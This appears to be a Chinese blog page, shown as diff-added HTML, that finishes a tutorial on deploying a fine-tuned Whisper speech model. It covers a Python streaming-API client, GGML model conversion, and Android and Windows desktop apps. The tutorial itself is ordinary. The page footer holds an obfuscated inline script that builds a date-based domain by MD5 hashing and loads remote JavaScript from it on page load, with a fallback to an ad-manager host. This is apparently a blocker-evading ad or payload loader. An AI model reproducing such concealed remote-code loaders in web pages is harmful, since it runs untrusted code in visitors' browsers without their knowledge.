+<p>下面的是<code>/recognition_stream</code>的调用方式。</p> 
+<pre><code class="prism language-python"><span class="token keyword">import</span> json
+<span class="token keyword">import</span> requests
+
+response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://127.0.0.1:5000/recognition_stream"</span><span class="token punctuation">,</span>
+                         files<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"audio"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"test.wav"</span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"dataset/test_long.wav"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'audio/wav'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+                         json<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"to_simple"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"remove_pun"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"task"</span><span class="token punctuation">:</span> <span class="token string">"transcribe"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> stream<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> chunk <span class="token keyword">in</span> response<span class="token punctuation">.</span>iter_lines<span class="token punctuation">(</span>decode_unicode<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> delimiter<span class="token operator">=</span><span class="token string">b"\0"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> chunk<span class="token punctuation">:</span>
+        result <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>chunk<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        text <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">"result"</span><span class="token punctuation">]</span>
+        start <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">"start"</span><span class="token punctuation">]</span>
+        end <span class="token operator">=</span> result<span class="token punctuation">[</span><span class="token string">"end"</span><span class="token punctuation">]</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>start<span class="token punctuation">}</span></span><span class="token string"> - </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>end<span class="token punctuation">}</span></span><span class="token string">]：</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+</code></pre> 
+<p>提供的测试页面如下：</p> 
+<p>首页<code>http://127.0.0.1:5000/</code> 的页面如下：<br> <img src="https://images2.imgbox.com/5d/dc/lr2hgwEu_o.jpg" alt="在这里插入图片描述"></p> 
+<p>文档页面<code>http://127.0.0.1:5000/docs</code> 的页面如下：<br> <img src="https://images2.imgbox.com/d6/40/YIbUjWzK_o.jpg" alt="在这里插入图片描述"></p> 
+<h2><a id="Android_318"></a>Android部署</h2> 
+<p>安装部署的源码在<a href="https://github.com/yeyupiaoling/Whisper-Finetune/tree/master/AndroidDemo">AndroidDemo</a>目录下。</p> 
+<h3><a id="_322"></a>转换模型</h3> 
+<ol><li>首先要克隆Whisper原生的源码，因为需要它的一些文件，请在<code>Whisper-Finetune</code>项目根目录下执行下面命令。</li></ol> 
+<pre><code class="prism language-shell"><span class="token function">git</span> clone https://github.com/openai/whisper.git
+</code></pre> 
+<ol start="2"><li>然后开始转换模型，请在<code>Whisper-Finetune</code>项目根目录下执行<code>convert-ggml.py</code>程序，把模型转换为Android项目所需的ggml格式的模型，需要转换的模型可以是原始的Transformers模型，也可以是微调的模型。</li></ol> 
+<pre><code class="prism language-shell">python convert-ggml.py <span class="token parameter variable">--model_dir</span><span class="token operator">=</span>models/whisper-tiny-finetune/ <span class="token parameter variable">--whisper_dir</span><span class="token operator">=</span>whisper/ <span class="token parameter variable">--output_path</span><span class="token operator">=</span>models/ggml-model.bin
+</code></pre> 
+<ol start="3"><li>把模型放在Android项目的<code>app/src/main/assets/models</code>目录下，然后就可以使用Android Studio打开项目了。</li></ol> 
+<h3><a id="_336"></a>编译说明</h3> 
+<ol><li>默认使用的NDK版本是<code>25.2.9519653</code>，如果下面修改其他版本，要修改<code>app/build.gradle</code>里面的配置。</li><li><strong>注意，在真正使用时，一定要发布<code>release</code>的APK包，这样推理速度才快。</strong></li><li>本项目已经发布了<code>release</code>的APK包，请在<code>Whisper-Finetune</code>项目主页的最后扫码下载。</li></ol> 
+<h3><a id="_342"></a>效果图</h3> 
+<br> 
+<div align="center"> 
+ <img src="https://images2.imgbox.com/bc/7a/MgZfitu0_o.jpg" alt="Android效果图" width="200"> 
+ <img src="https://images2.imgbox.com/02/d2/alK9EdvW_o.jpg" alt="Android效果图" width="200"> 
+ <img src="https://images2.imgbox.com/32/9d/KW2kACLx_o.jpg" alt="Android效果图" width="200"> 
+ <img src="https://images2.imgbox.com/6a/e2/rWkPxIu2_o.jpg" alt="Android效果图" width="200"> 
+</div> 
+<h2><a id="Windows_351"></a>Windows桌面应用</h2> 
+<p>程序在<a href="https://github.com/yeyupiaoling/Whisper-Finetune/tree/master/WhisperDesktop">WhisperDesktop</a>目录下。该程序是使用<a href="https://github.com/Const-me/Whisper">Whisper</a>翻译得的，源码可以前面该项目查看。该程序使用的模型格式是GGML格式，跟Android部署的一样，所以需要转换模型格式才能使用。</p> 
+<h3><a id="_355"></a>转换模型</h3> 
+<ol><li>首先要克隆Whisper原生的源码，因为需要它的一些文件，请在<code>Whisper-Finetune</code>项目根目录下执行下面命令。</li></ol> 
+<pre><code class="prism language-shell"><span class="token function">git</span> clone https://github.com/openai/whisper.git
+</code></pre> 
+<ol start="2"><li>然后开始转换模型，请在<code>Whisper-Finetune</code>项目根目录下执行<code>convert-ggml.py</code>程序，把模型转换为Android项目所需的ggml格式的模型，需要转换的模型可以是原始的Transformers模型，也可以是微调的模型。</li></ol> 
+<pre><code class="prism language-shell">python convert-ggml.py <span class="token parameter variable">--model_dir</span><span class="token operator">=</span>models/whisper-tiny-finetune/ <span class="token parameter variable">--whisper_dir</span><span class="token operator">=</span>whisper/ <span class="token parameter variable">--output_path</span><span class="token operator">=</span>models/whisper-tiny-finetune-ggml.bin
+</code></pre> 
+<h3><a id="_368"></a>效果图</h3> 
+<p>效果图如下：<br> <br></p> 
+<div align="center"> 
+ <img src="https://images2.imgbox.com/93/37/if01YPlR_o.jpg" alt="Windows桌面应用效果图"> 
+ <br> 图1：加载模型页面 
+ <br> 
+ <img src="https://images2.imgbox.com/d2/37/485tWO6D_o.jpg" alt="Windows桌面应用效果图"> 
+ <br> 图2：选择音频文件转录 
+ <br> 
+ <img src="https://images2.imgbox.com/2a/76/JBIS0y7f_o.jpg" alt="Windows桌面应用效果图"> 
+ <br> 图3：录音转录 
+</div> 
+<h3><a id="_384"></a>参考资料</h3> 
+<ol><li>https://github.com/huggingface/peft</li><li>https://github.com/guillaumekln/faster-whisper</li><li>https://github.com/ggerganov/whisper.cpp</li><li>https://github.com/Const-me/Whisper</li></ol>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/c3f9d7405c3a7654eff5f6dc47e02e59/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">node重装-解铃还须系铃人</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/9783f805716ba139def6f777c4e08aa0/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">firewalld常用的基础配置</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程爱好者博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
